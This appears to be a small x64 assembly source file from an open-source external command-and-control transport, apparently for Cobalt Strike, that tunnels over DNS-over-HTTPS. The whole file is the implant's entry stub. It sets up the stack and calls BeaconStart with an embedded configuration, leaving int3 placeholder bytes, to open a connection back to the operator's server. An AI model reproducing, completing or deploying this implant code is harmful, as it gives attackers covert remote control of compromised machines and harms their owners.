;;
;; extc2: open source dns over http(s)
;; transport for cs. does not use the
;; smb beacon.
;;
[BITS 64]

GLOBAL Entry
EXTERN BeaconStart

[SECTION .text$A]

Entry:
	;; setup stack

	push	rsi
	mov	rsi, rsp
	and	rsp, 0FFFFFFFFFFFFFFF0h
	sub	rsp, 020h

	;; start connection back to ts

	lea	rcx, [rel Config]
	call	BeaconStart

	;; cleanup

	mov	rsp, rsi
	pop	rsi


	;; return

	ret

Config:
	int3
	int3
	int3
	int3
